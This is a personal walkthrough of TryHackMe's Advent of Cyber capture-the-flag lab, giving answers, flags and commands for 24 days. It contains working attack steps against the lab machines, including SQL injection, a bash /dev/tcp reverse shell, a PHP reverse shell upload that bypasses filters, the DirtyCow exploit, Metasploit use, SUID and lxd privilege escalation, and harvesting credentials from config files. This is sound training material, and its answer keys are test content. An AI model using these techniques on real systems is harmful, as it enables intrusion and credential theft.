# Advent of Cyber

## Day 1 - Web Exploitation: A Christmas Crisis

	- Credentials:
		username - kyle
		password - test1234
	1. Name of the cookie used for authentication
		auth - seen with F12 > storage > in browser on login page
	2. Format of the encoded value
		The value of the cookie appears to be hexadecimal (the hint tells us that it is the shorthand of binary)
	3. After being decoded, what format is the data stored in?
		The decoded data appears to be in JSON
	4. What is the value of santa's cookie?
		After decoding the cookie, your username can be seen, and can be changed to Santa then re-encoded.
	5. What is the flag given when the line is fully active?
		Using the reencoded cookie we can add a cookie with a name of "auth" and a value of the newly encoded cookie, it should by pass the login screen and allow us to change the assembly line to all on. 

## Day 2 - Web Exploitation: The Elf Strikes Back!

	- ID number to gian access to the upload page
		ODIzODI5MTNiYmYw
	1. String of texted added to the URL to access upload page
		?id=ODIzODI5MTNiYmYw
	2.What type of file is accepted by the site?
		image - tested png, jpg, jpeg
	3. Where are the uploaded files stored?
		/uploads/
	4. Activate the listener you have running
		go to webaddress - http://IPADDRESS/uploads/shell.jpg.php?id=ODIzODI5MTNiYmYw

## Day 3 - Web Exploitation: Christmas Chaos

	1. This task is teaching you how to use burp suite. I configured foxyproxy to forward traffic to burp suite when turned on. Go to the website, attemp to log in and let burp capture the request. Send the request to Intruder with a right click. Running the suggested password through intruder, they all have the same status, which is a redirect error, but the length on one is different and worth checking out. 

## Day 4 - Web Exploitation: Santa's Watching

	- In this challenge make sure to either make a date wordlist in the format that they suggest, or download the one from the challenge. 
	1. run gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://IP to use the word list on the site directory to find the api/ directory
	2. Notice the file that is in the api directory when you go there from a web browser.
		site-log.php
	3. use wfuzz -c -z file,wordlist http://10.10.134.147/api/site-log.php?date=FUZZ to fuzz the date and search for the file that has the flag in it.

## Day 5 - Web Exploitation: Someone stole Santa's gift list!

	1. Sanata's login panel without brute forcing?
		/santapanel
	2. visit the secretpanel and by pass the login
		' or true -- into the username field will log you into the panel as Santa
	3. How many entries are in the gift database?
		ORDER+BY 2-- shows us all the entries in the database and counting them, there are 22
	4. What did paul ask for?
		github ownership
	- To find the rest of the information I turned on Foxyproxy, opened Burp Suite and typed in the command from question number 3, once the request showed up in burp suite, I sent it to repeater and save the item. Once saved I was able to open the saved request in sqlmap with the command sqlmap -r <filename> --level --dump-all
	5. what is the flag
		thmfox{All_I_Want_for_Christmas_Is_You}
	6. What is the admin's password?
		EhCNSWzzFP6sc7gB

## Day 6 - Web Exploitation: Be careful with what you wish on a Christmas night

	1. What vulnerability type was used to exploit the application?
		Because you can post comments that allow you to save a script and have it execute everytime the page is loaded this is Store XSS
	2. What query string can be abused to craft a reflected XSS?
		When executing a search, q is added to the query
	3. How many XSS alerts are in the scan?
		ZAP said 6, but I think the question means to ask how many high alerts are in the scan. because the answer to that is 2

## Day 7 - Networking: The Grinch Really Did Steal Christmas

	1. What is the IP address that initiates ICMP?
		To get this open the packet capture in Wireshark, and in the filter bar type ICMP to only show icmp
	2. To see Http get requests, what filter would you use?
		http.request.method==get
	3. Using a filter, what is the name of the article that 10.10.67.199 visited?
		filtering out get requests and looking for the item that wasn't a icon pack or exporting the data it is easy to see that article was titled reinder-of-the-week
	4. Using pcap2 what password was leaked during the login process?
		typing ftp in the filter bar, find the user elfmcskidy, right click and select follow stream, in the popup window see the displayed password. plaintex_password_fiasco
	5. What is the name of the protocol that is encrypted?
		Sort by protocol and locate the encrypted protocol SSH
	6. What is on Elf McSkidy's wishlist that will be used to replace Elf McEager?
		Open pcap, export http and locate christmas.zip. Save and unzip. Locate wish list filee in zip file. Rubber ducky

## Day 8 - Networking: What's under the Christmas tree?

	1. When was snort created?
		1998
	2. What 3 services are running on the server?
		80, 2222, 3389 - using command nmap -sS -p- <IP>
	5. What OS distribution is likly on this machine?
		Ubuntu - nmap -A <IP>
	6. What might the webserver be used for?
		Internal Blog - nmap -A <IP>

## Day 9 - Networking - Anyone can be Santa!

	1. What folder does  the anonymous user have access to?
		public - checked by typing ls -al 
	2. What script gets executed within this directory?
		backup.sh - this can be assumed because it is a backup script, as well as if you read the comments in the script is tells you that it is ru every day
	3. What did Santa have on the christmas shopping list?
		The Polar Express - The shopping file is in the same directory as the backup script.
	4. What is the contents of the flag?
		THM{even_you_can_be_santa} - The flag is located in the root home directory, so how do we get there? We use a reverse shell. We need to download the backup script and modify it and reupload the script so that it gets executed and runs the commands that you want it to run. Using the pentesters cheatsheet, we can see a one line command that when executed redirects a shell to a listening IP address. This command is bash -i >& /dev/tcp/<Your IP Address>/4444 0>&1 .On your attacking machine you need to have a netcat listener running, using the command nc -lvnp 4444, in a new comand line. After waiting a minute the script will run and you will be granted access to a shell on your netcat listener where you can read the contents of the file.

## Day 10 - Networking: Don't be sElfish!

	1. How many users are there one the Samba server?
		3 - you are able to use enum4linux -U <IP> and it will list how many users there are
	2. How many shares are on the Samba server?
		4 - you are able to use enum4linux -S <IP> and it will list how many shares there are
	3. What share doesn't require a password?
		tbfc-santa - when running enum4linux -S this was my first choice because it was the only one that listed ok. Trying smbclient on that share, allowed me to login without any password.
	4. What directory did ElfMcSkidy leave for Santa?
		jingle-tunes - once logged in to the samba share, you can run ls and it will list like a normal shell.

## Day 11 - Networking: The Rogue Gnome: Prelude

	1. What type of privilege escalation involves using a user account to execute commands as an administrator?
		vertical
	2. What is the name of the file that contains a list of users who are a part of the sudo group?
		sudoers
	3. What are the contents of the file located at /root/flag.txt
		This is probably the trickiest task of the advent so far this year. The LinEnum script needs to be downloaded first and placed in a directory. From here start up a simple file server with python. for python2.7 - python -m SimpleHTTPServer 8080 and for python 3+ - python3 -m http.server 8080, both of these do the same thing and must be started from the same directory that your LinEnum script is located. Once started up log into the machine you are given the credentials for, and change the directory you have write permissions to like /tmp (your home directory has write permissions in this instance, but that is not always the case), and run wget http://<yourip>:8080/LinEnum.sh. This will upload the script to the remote server from your machine. One it is downloaded set the script to be executeable, and run it.  The ouput gives you some suggestions for suids that are of interest. On this server the the suid of insterst is bash. Using the getfobins site, it tells us that to use bash with a suid bit it should be run with bash -p. This retuns a bash prompt. From here you are running as root and can read the flag file in the root directory. 

## Day 12 - Networking: Ready, Set, Elf

	1. What is the version number of the web server?
		The web server is an Apache Tomcat 9.0.17 server this can be obtained from an nmap scan, sudo nmap -sS -sV --script vuln <IP>
	2. What CVE can be used to create a meterpreter entry onto the machine? 
		The same nmap scan as the previous question will show this information sudo nmap -sS -sV --script vuln <IP> 
	3. What are the contents of flag1.txt?
		thm{whacking_all_the_elves} I was able to acheive this by using metasploit. Once I started up metasploit I use the search feature and search for that cve specified. I then use the exploit that it recommends. Set all the options in the challenge description, most importantly the targeturi, rhosts, and lhost. Then exploit the machine. It will get a meterpreter session and you can read the flag from this session. One step further, I was able to choose the ElfWhacker.exe process and migrate to it sucessfully, which escalated my privileges to NTSYSTEM

## Day 13 - Special by John Hammond: Coal for Christmas

	1. What old, deprecated protocol and service is running?
		nmap -sCV <IP> will display telnet is running on this machine
	2. What credential was left for you?
		clauschristmas - this can be found by running telnet <IP>
	3. What distribution of Linux and version number is this server running?
		Running cat /etc/*release will reveal the version to be Ubuntu 12.04
	4.Who got here first?
		grinch - this can be found by running cat cookies_and_milk.txt
	5. What is the verbatim syntax you can use to compile, takenfrom the real C source code comments?
		gcc -pthread dirty.c -o dirty -lcrypt - I was able to find this by searching for dirtycow sourcecode. I was able to cope that code to a .c file and upload it to the server using the python SimpleHTTPServer module. Once the file was uploaded to the server, the comments in the source code mentioned what to run to compile the file.
	6. What new username was created, with the defaul operation of the real C source code?
		firefart - this can be seen in the output from the script
	7. What is the MD5 hash output?
		8b16f00dd3b51efadb02c1df7f8427cc - this was found by changing to the root directory and running cat, on the file called message_from_the_grinch.txt in this directory and following the instructions

## Day 14 - Special by TheCyberMentor: Where's Rudolph? - OSINT

	1. What URL will take me directly to Rudolph's Reddit comment history?
		https://www.reddit.com/user/IGuidetheClaus2020/comments - this can be found with a quick search of the provided username on google or reddit directly
	2. According to Rudolph, where was he born?
		Chicago - info provided in reddit post
	3. Rudolph mentions Robert.  Can you use Google to tell me Robert's last name?
		He is referring to his creator Robert May
	4. On what other social media platform might Rudolph have an account?
		Twitter - is his reddit post, he mentions twitter meaning he likely has an account.
	5. What is Rudolph's username on that platform?
		IGuideClaus2020 - searched google
	6. What appears to be Rudolph's favorite TV show right now?
		Bachelorette - mentioned on his twitter account
	7. Based on Rudolph's post history, he took part in a parade.  Where did the parade take place?
		Chicago
	8. Okay, you found the city, but where specifically was one of the photos taken?
		41.891815, -87.624277 - Searched the photo using http://exif.regex.info/exif.cgi
	9. Did you find a flag too?
		{FLAG}ALWAYSCHECKTHEEXIFD4T4 -also in the exif data
	10. Has Rudolph been pwned? What password of his appeared in a breach?
		sypgame - Search his email using haveibeenpwned.com, after confirming a breach, I searched for his email in https://scylla.sh/api to locate a password that was found for him.
	11. Based on all the information gathered. It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile. What are the street numbers of the hotel address?
		540 - using the coordinates, and google maps to locate hexact address of the Marriot that he was staying in.

## Day 15 - Scripting: There's a Python in my stocking!

	1. What's the output of True + True?
		2 - True is equal to 1, so naturally 1 + 1 = 2
	2. What's the database for installing other peoples libraries called?
		PyPi - this was in the challenge information
	3. What is the output of bool("False")?
		True - False is a bool, so the answer is True
	4.What library lets us download the HTML of a webpage?
		Requests
	5. What is the output of the program provided in "Code to analyse for Question 5" in today's material?
		[1, 2, 3, 6] - this takes a list of [1, 2, 3] and appends a 6 to the end of the list
	6. What causes the previous task to output that?
		Pass by reference - this was in the challenge info

## Day 16 - Scripting: Help! Where is Santa?

	1. What is the port number for the web server?
		8000 - This was obtained from an nmap scan. nmap -sCVS <IP>
	2. Without using enumerations tools such as Dirbuster, what is the directory for the API?  (without the API key)
		/api/ - looking at all the hyperlinks one of the links shows this directory. This is also a pretty common directory
	3. Where is Santa right now?
		Winter Wonderland, Hyde Park, London. - Found this by writing a script that used a for loop to loop through a range from 1-100 only odd numbers to find the api key.
	4. Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you.
		57 - using the above mentioned script
	```
	#! /usr/bin/env python
	import requests
	server = 'http://10.10.75.73:'
	port = '8000'

	for i in range(1, 100, 2):
    	j = str(i)
    	r = requests.get(server + port + '/api/' + j)
    	print(r.text) ```

## Day 17 - Reverse Engineering: ReverseELFneering

	1.  What is the value of local_ch when its corresponding movl instruction is called (first if multiple)? 
		1 - 0x00400b51 b    c745f4010000.  mov dword [local_ch], 1 this is the line where the number 1 gets moved into the local_ch variable
	2. What is the value of eax when the imull instruction is called?
		6 - 0x00400b58      c745f8060000.  mov dword [local_8h], 6 this line shows where the number 6 is multiplied by eax
	3. What is the value of local_4h before eax is set to 0?
		6 - from the same line as above it was set to 6 and wasn't changed until it was set to 0.

## Day 18 - Reverse Engineering: The Bits of Christmas

	2. What is Santa's password?
		santapassword321 - by searching around in different locations in the program break down I was able to find the password verification page. 
	3. Now that you've retrieved this password, try to login...What is the flag?
		thm{046af} - on the same page as the password verification, with a correct password it reveals the flag

## Day 19 - Special by Tib3rius: The Naughty or Nice List

	This task is a guided task
	
## Day 20 - Blue Teaming: PowershELlF to the rescue 	

	1. Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?
		2 front teeth - to find this you can use the powershell cmdlet Get-ChildItem -File -Hidden then read the contents of the file
	2. Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?
		Scrooged - to find this you can use a similar cmdlet Get-ChildItem -directory -hidden 
	3. Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder? 
		3lfthr3e -  to find the answer to this you can use the command ```Get-ChildItem -Path C:\Windows -Directory -Recurse - Hidden -ErrorAction SilentlyContinue``` This command will take a minute to run, and will output a lot of information you will just have to look though the list to find that it is in System32 directory.
	4. How many words does the first file contain?
		9999 - After changing directories to the 3lfthr3e directory, use the cmdlet ```Get-Content -Path .\1.txt | Measure-Object -Word```` this will output the number of words in this file.
	5. What 2 words are at index 551 and 6991 in the first file?
		Red Ryder - the cmdlet for this is ````(Get-Content -Path 2.txt)[551]``` and ```(Get-Content -Path 2.txt)[6991]```
	6. This is only half the answer. Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want?
		Red Ryder BB Gun - the cmdlet for this is ```Select-String -Path 2.txt -pattern 'redryder*'````

## Day 21 - Blue Teaming: Time for some ELForensics

	1. Read the contents of the text file within the Documents folder. What is the file hash for db.exe?
		596690FFC54AB6101932856E6A78E3A1 - This can be found by changing to the Documents directory for the user little helper and running the command ````type '.\db file hash.txt'````
	2. What is the file hash of the mysterious executable within the Documents folder?
		5F037501FB542AD2D9B06EB12AED09F0 - This can be found by running the powershell cmdlet ```Get-Filehash -Algorithm MD5 .\deebee.exe```
	3. Using Strings find the hidden flag within the executable?
		THM{f6187e6cbeb1214139ef313e108cb6f9} - this can be found by running the program called strings on the deebee.exe file. ```c:\Tools\strings64.exe .\deebee.exe```
	4. What is the flag that is displayed when you run the database connector file?
		THM{088731ddc7b9fdeccaed982b07c297c} - the first thing to do is to run the deebee.exe file and see what it outputs. Which tells you that the database connection file has been hidden, but we need to check the Alternate Data Stream(ADS) of this file using the cmdlet ```Get-Item -Path .\deebee.exe -Stream *``` this displays that there is a hidden portion of this file that needs to be shown. We can then run the exe from this ADS using the command ```wmic process call create $(Resolve-Path .\deebee.exe:hidedb)

## Day 22 - Blue Teaming: Elf McEager becomes CyberElf

	1. What is the password to the KeePass database?
		thegrinchwashere - To find this password I was able to open cyberchef, select the 'magic' recipe, and paste the name of the folder into cyberchef. It was able to decode the name a base64.
	2. What is the encoding method listed as the 'Matching ops'?
		base64 - cyberchef tells us this.
	3. What is the decoded password value of the Elf Server?
		sn0wM4n! - I was able to get this by take the encoded password and decode it in cyberchef. It was encoded in hex
	4. What is the decoded password value for ElfMail?
		ic3Skating! - this was also able to be decoded with cyberchef it was encoded in html.
	5. Decode the last encoded value. What is the flag?
		THM{657012dcf3d1318dca0ed864f0e70535} - this was a little trickier. To get the flag you had to look in the keepass recycling bin and looking in the notes of the only entry there. Putting the notes in cyberchef doesn't do anything. A google search on the function that is in the notes google tells that it is javascript. I wasa able to locate an online converter for those numbers and it decodes to pretty long string, that appears to have another javascript function in it. I  was able to take the numbers that are in the decoded javascript, and decode them as well and it decodes to a website. Once you go to the website you can see the flag at the top of the screen.

## Day 23 - Blue Teaming: The Grinch Strikes Again

	1. Decrypt the fake 'bitcoin address' within the ransom note. What is the plain text value?
		nomorebestfestivalcompany - this password is bas64 encrypted
	2.At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?
		.grinch - looking through the documents folder all the files have a .grinch file extension on them.
	3. What is the name of the suspicious scheduled task?
		opidsfsdf - this is located in the Task Scheduler Library folder in Task Scheduler
	4. Inspect the properties of the scheduled task. What is the location of the executable that is run at login?
		C:\Users\Administrator\Desktop\opidsfsdf.exe - this is seen in the actions tab of the scheduled task.
	5. There is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID?
		7a9eea15-0000-0000-0000-010000000000 - address is seen in the ShadowCopyVolume scheduled task
	6. Assign the hidden partition a letter. What is the name of the hidden folder?
		confidential - the hidden partition is called backup, assign this a drive letter, show hidden files and folders
	7. Right-click and inspect the properties for the hidden folder. Use the 'Previous Versions' tab to restore the encrypted file that is within this hidden folder to the previous version. What is the password within the file?
		m33pa55w0rdIZseecure! - restore previous version of the folder and masterpassword.txt file becomes apparent.

## Day 24 - Special by DarkStar: The Trial Before Christmas

	1.Scan the machine. What ports are open?
		80, 65000 - usd nmap -sSVC <ipaddress>
	2. What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step.
		Light Cycle - This is the title of the site on port 65000
	3. What is the name of the hidden php page?
		uploads.php - Gobuster finds this page pretty quickly. Used the command gobuster dir -u <url> -x .php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
	4. What is the name of the hidden directory where file uploads are saved?
		grid - this was found with gobuster. gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
	5. Bypass the filters. Upload and execute a reverse shell. 
		 use burp suite to bypass the client side filter. Turn on the proxy and load the upload page, on the proxy tab go to options and turn on "Intercept Cllient Requests" and remove java script from the file extension filter. Alo turn on "Intercept Server Responses" as well. Upload the php reverse shell file and turn on netcat with the command nc -lvnp 1234
	6. Upgrade and stabilize your shell. 
		we have a shell but it is not stable, to stablize the shell run "python3 -c 'import pty;pty.spawn("/bin/bash")'" to get a full shell, then export TERM=xterm so that terminal commands work, and finally ctrl + z to background the shell and run the command stty raw -echo; fg to get a fully functioning shell.
	7. Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password
		tron:IFightForTheUsers - this can be found using the command grep -rnw /var -e 'dbuser' we can assume that the username is dbuser because we are looking for database credentials, but you could also try different search terms.
	8. Access the database and discover the encrypted credentials. What is the name of the database you find these in?
		tron - this can be found by using the mysql. The command is mysql -utron -pIFightForTheUsers, which will log us in. Then we use show databases; to list all the databases.
	9.Crack the password. What is it?
		@computer@ - to get this I used the following process. I used the command "use tron;" to use the database, then I use "show tables;" to list the tables in the database, then "select * from users;" to list all the items in the table. This will give a username and a password that is hashed. Using crackstation.net I was able to crack the hash.
	10. Use su to login to the newly discovered user by exploiting password reuse. 
		typed "su flynn" then tried the password and was logged in successfully.
	11. What is the value of the user.txt flag?
		THM{IDENTITY_DISC_RECOGNISED} - "cat ~/user.txt"
	12.Check the user's groups. Which group can be leveraged to escalate privileges? 
		lxd - this can be found by typing the command 'id' to show the groups
	13. Abuse this group to escalate privileges to root.
		following the instructions on the challenge: 3. For the sake of this example, we'll be skipping close to the end (see the bolded bit above) by checking what images are readily available on the machine in question. We can do that via the following commands: 

			lxc image list
			
			Checking what images are available via the command: lxc image list

			4. Now for the fun bit. Next, we'll run a series of commands which initialize, configure the disks, and start the container. Image name needs to match up with the imported image we'll be using. In the case of the image above, that'd be the myimage alias previously assigned to it. The container name and device name are whatever your heart desires. In my example, I'm naming my container strongbad and the device trogdor.

			lxc init IMAGENAME CONTAINERNAME -c security.privileged=true

			Ex: lxc init myimage strongbad -c security.privileged=true

			lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true

			Ex: lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true

			lxc start CONTAINERNAME

			Ex: lxc start strongbad

			lxc exec CONTAINERNAME /bin/sh

			Ex: lxc exec strongbad /bin/sh

			We'll then run just a few more commands to mount our storage and verify we've escalated to root:

			id

			cd /mnt/root/root
	14. What is the value of the root.txt flag?
		THM{FLYNN_LIVES} - "cat root.txt"
